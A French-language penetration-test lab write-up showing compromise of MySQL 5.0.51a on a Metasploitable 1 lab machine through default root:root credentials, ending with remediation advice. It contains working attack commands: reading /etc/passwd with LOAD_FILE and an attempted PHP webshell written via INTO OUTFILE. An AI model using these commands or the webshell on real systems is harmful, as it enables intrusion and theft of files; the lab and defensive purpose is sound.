MySQL 5.0.51a — Compromission par identifiants par défaut

Accès root complet puis lecture/écriture arbitraire de fichiers système via le privilège FILE

Service / PortMySQL 5.0.51a — port 3306
CibleMetasploitable 1 — 192.168.56.102
CVE— (identifiants par défaut, pas une CVE précise)
RésultatAccès root base de données + lecture/écriture arbitraire de fichiers
Testé parZANNOU Josaphat
Note réseau. Cette page utilise le réseau de Josaphat (vboxnet0) : cible 192.168.56.102. Côté Jules, le même service est sur 172.28.128.4.

1. Identification

$ nmap -sC -sV -p 3306 192.168.56.102
3306/tcp open  mysql   MySQL 5.0.51a-3ubuntu5

2. Méthode d'identification et authentification

Pas de CVE à chercher ici : l'hypothèse testée est directement les identifiants par défaut du labo (root:root).

$ mysql -h 192.168.56.102 -u root -proot -e "SELECT VERSION();"
ERROR 2026 (HY000): TLS/SSL error: wrong version number

Échec dû au client, pas à la cible : le serveur MySQL 5.0 de 2008 ne gère pas la négociation TLS attendue par le client MariaDB moderne de Kali. Correction : désactiver le TLS côté client (--skip-ssl) :

$ mysql -h 192.168.56.102 -u root -proot --skip-ssl -e "SELECT VERSION(); SELECT CURRENT_USER();"
VERSION()
5.0.51a-3ubuntu5
CURRENT_USER()
root@%

→ root:root fonctionne, aucune restriction d'hôte (root@% = connexion depuis n'importe quelle IP acceptée).

Mécanisme. Au-delà de l'accès SQL lui-même, le privilège FILE_priv permet de lire et écrire des fichiers arbitraires sur le système de fichiers, avec les droits du processus mysqld — une porte de sortie hors de la base de données. 
$ mysql -h 192.168.56.102 -u root -proot --skip-ssl -e "SHOW GRANTS FOR root@'%';"
GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' ... WITH GRANT OPTION

$ mysql -h 192.168.56.102 -u root -proot --skip-ssl -e "SELECT user, File_priv FROM mysql.user WHERE user='root';"
user	File_priv
root	Y

3. Démarche d'exploitation

a) Lecture de fichiers arbitraires.

$ mysql -h 192.168.56.102 -u root -proot --skip-ssl -e "SELECT LOAD_FILE('/etc/passwd');"
root:x:0:0:root:/root:/bin/bash
...
msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
...
user:x:1001:1001:just a user,111,,:/home/user:/bin/bash
service:x:1002:1002:,,,:/home/service:/bin/bash

/etc/passwd entier récupéré, confirmant les comptes msfadmin/ user/service du labo (déjà vus en RID cycling SMB, voir samba-enum.html) — recoupement entre deux services distincts.

b) Tentative d'écriture — webshell (échec, mécanisme confirmé).

$ mysql -h 192.168.56.102 -u root -proot --skip-ssl -e "SELECT '<?php system(\$_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/tikiwiki/mysqlshell.php';"
ERROR 1 (HY000) at line 1: Can't create/write to file '/var/www/tikiwiki/mysqlshell.php' (Errcode: 13)

$ mysql -h 192.168.56.102 -u root -proot --skip-ssl -e "SELECT 'test_mysql_file_priv' INTO OUTFILE '/tmp/mysql_write_test.txt';"
$ mysql -h 192.168.56.102 -u root -proot --skip-ssl -e "SELECT LOAD_FILE('/tmp/mysql_write_test.txt');"
test_mysql_file_priv

Échec (Errcode: 13 = Permission denied) : ce n'est pas un refus de privilège MySQL, mais une restriction du système de fichiers — le compte mysqld n'a pas les droits d'écriture sur ce répertoire précis. L'écriture dans /tmp fonctionne : confirme que le privilège FILE est bien actif en écriture. Sur une cible où le webroot serait accessible en écriture par le compte MySQL, cette technique aboutirait à un webshell et donc une RCE complète.

4. Preuve d'accès obtenu

CURRENT_USER() = root@% (accès root complet à la base), File_priv = Y (lecture/écriture arbitraire confirmée), LOAD_FILE('/etc/passwd') (fichier système sensible lu intégralement). Pas de shell système direct obtenu ici (webroot non accessible en écriture), mais la primitive de lecture/écriture arbitraire est un résultat fort en soi.

5. Remédiation

RECOMMANDATIONS
  • Changer le mot de passe root par défaut (root:root) — cause racine de cette compromission.
  • Restreindre l'accès réseau à MySQL (bind-address, pare-feu).
  • Retirer le privilège FILE des comptes applicatifs : il n'est quasiment jamais nécessaire et transforme une compromission de compte en lecture/écriture arbitraire de fichiers.
  • Faire tourner mysqld avec un compte système dédié aux droits minimaux, sans accès en écriture aux répertoires servis par le serveur web.
  • Mettre à jour MySQL : la version 5.0.51a (2008) est très obsolète.
